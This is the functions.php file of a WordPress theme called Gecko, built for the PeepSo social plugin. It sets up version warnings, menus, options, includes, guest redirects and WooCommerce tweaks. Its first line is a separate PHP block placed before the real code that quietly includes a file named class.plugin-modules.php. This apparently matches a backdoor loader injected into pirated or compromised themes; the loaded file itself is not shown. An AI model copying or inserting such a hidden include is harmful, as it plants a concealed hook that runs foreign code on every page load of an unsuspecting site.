<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

// PeepSo Version Check
$ver_gecko = explode('.', wp_get_theme()->version);
array_pop($ver_gecko);
$ver_gecko = implode('.', $ver_gecko);

if(class_exists('PeepSo')) {

    $ver_peepso = explode('.',PeepSo::PLUGIN_VERSION);
    if(count($ver_peepso) == 4) {
        array_pop($ver_peepso);
    }

    $ver_peepso = implode('.', $ver_peepso);

    if($ver_peepso != $ver_gecko) {
        // @TODO RAISE WARNING #3343
        add_action('admin_notices', function () {
            echo '<div class="error peepso">' .
                sprintf(__('Please make sure the first three version numbers of PeepSo plugins %s and Gecko theme %s match. It’d be best to update the plugins and theme to latest versions.', 'gecko'), PeepSo::PLUGIN_VERSION, wp_get_theme()->version)
                . '</strong></div>';
        });
    }
}


//  ENQUEUE SCRIPTS
require_once( __DIR__ . '/core/enqueue-scripts.php');


//
//  REGISTER MENU
//
register_nav_menus( array(
  'primary-menu' => 'Header Menu',
  'footer-menu'  => 'Footer Menu',
));


//
// LANGUAGE
//
function gecko_load_theme_textdomain() {
  load_theme_textdomain( 'gecko', get_template_directory() . '/language' );
}
add_action( 'after_setup_theme', 'gecko_load_theme_textdomain' );


// SETUP INITIAL CONFIG
/* Tell WordPress to run gecko_setup() when the 'after_switch_theme' hook is run. */
function gecko_setup() {
  $default_config = array(
    'opt_show_searchbar' => '',
    'opt_limit_page_options' => '',
    'opt_disable_smooth_scroll' => '0',
    'opt_sticky_sidebar' => '0',
    'opt_zoom_feature' => '0',
    'opt_hide_blog_sidebars' => '',
    'opt_hide_blog_update' => '',
    'opt_blog_grid' => '',
    'opt_archives_grid' => '',
    'opt_search_grid' => '',
    'opt_woo_builder' => '',
    'opt_woo_sidebars'  => '',
    'opt_ld_sidebars' => '',
    'gecko_license' => '',
    'opt_limit_blog_post' => '0'
  );

  add_option('gecko_options', $default_config);
}
add_action( 'after_switch_theme', 'gecko_setup' );


//
//  INCLUDES
//

//  helper class
require_once( __DIR__ . '/core/helpers.php');

//  date class
require_once( __DIR__ . '/core/date.php');

//  OPTIONS class
require_once( __DIR__ . '/core/admin/options.php');

//  SETTINGS PAGE
require_once( __DIR__ . '/core/admin/settings.php');

//  PAGE BUILDERS PAGE
require_once( __DIR__ . '/core/admin/page_builders.php');

//  SETTINGS - LICENSE SUBPAGE
require_once( __DIR__ . '/core/admin/license.php');

//  CUSTOMIZER
require_once( __DIR__ . '/core/admin/customizer.php');

//  WIDGETS
require_once( __DIR__ . '/core/widgets.php');

//  LAYOUT OPTIONS
require_once( __DIR__ . '/core/layout.php');

//  PAGE OPTIONS
require_once( __DIR__ . '/core/page.php');

//  LANDING OPTIONS
require_once( __DIR__ . '/core/landing.php');

//  UTILITY FUNCTIONS
require_once( __DIR__ . '/core/utility.php');


// Save config
if(isset($_REQUEST['gecko_options']) && current_user_can('manage_options')) {

  $options = apply_filters('gecko_sanitize_option', $_REQUEST['gecko_options']);

  foreach ($options as $key => $value) {
    GeckoConfigSettings::get_instance()->set_option(
      $key,
      $value,
      TRUE
    );
  }
}


//
//  REDIRECTS
//
function is_login_page() {
    global $wp, $wpdb;
    $register_id = $wpdb->get_var('SELECT ID FROM '.$wpdb->prefix.'posts WHERE post_content LIKE "%[peepso_register]%" AND post_parent = 0');
    $recovery_id = $wpdb->get_var('SELECT ID FROM '.$wpdb->prefix.'posts WHERE post_content LIKE "%[peepso_recover]%" AND post_parent = 0');
    $reset_id = $wpdb->get_var('SELECT ID FROM '.$wpdb->prefix.'posts WHERE post_content LIKE "%[peepso_reset]%" AND post_parent = 0');

    if ( $GLOBALS['pagenow'] === 'wp-login.php' && ! empty( $_REQUEST['action'] ) && $_REQUEST['action'] === 'register' || is_page( array( $register_id, $recovery_id, $reset_id ) ) )
        return true;
    return false;
}

function guest_redirect() {
    global $wp;
    $settings = GeckoConfigSettings::get_instance();
    $value = $settings->get_option( 'opt_redirect_guest', 0 );

    if ($value < 1) return false;

    $page_id = $value;

    //Don't redirect if user is logged in or user is trying to sign up or sign in
    if( !is_login_page() && !is_admin() && !is_user_logged_in()) {
        //$page_id is the page id of landing page
        if( !is_page($page_id) ){
            $redirect = trim(get_permalink($page_id), '/');
            if ($redirect != home_url( $wp->request )) {
              wp_redirect( $redirect );
              exit;
            }
        }
    }
}
add_action( 'template_redirect', 'guest_redirect' );


// HTML Classes Array
function gecko_get_html_class( $class = '' ) {
  $classes = array();

  if ( ! empty( $class ) ) {
    if ( ! is_array( $class ) ) {
      $class = preg_split( '#\s+#', $class );
    }
    $classes = array_merge( $classes, $class );
  } else {
    // Ensure that we always coerce class to being an array.
    $class = array();
  }

  $classes = array_map( 'esc_attr', $classes );

  $classes = apply_filters( 'gecko_html_class', $classes, $class );

  return array_unique( $classes );
}

function gecko_html_class( $class = '' ) {
  // Separates class names with a single space, collates class names for body element
  echo 'class="' . join( ' ', gecko_get_html_class( $class ) ) . '"';
}

//  HEADER FUNCTIONS
require_once( __DIR__ . '/core/header.php');

//  WooCommerce loop columns
/**
 * Change number or products per row to 3
 */
add_filter('loop_shop_columns', 'loop_columns', 999);
if (!function_exists('loop_columns')) {
  function loop_columns() {
    return 3; // 3 products per row
  }
}

add_filter( 'woocommerce_widget_cart_is_hidden', 'always_show_cart', 40, 0 );
function always_show_cart() {
    return false;
}
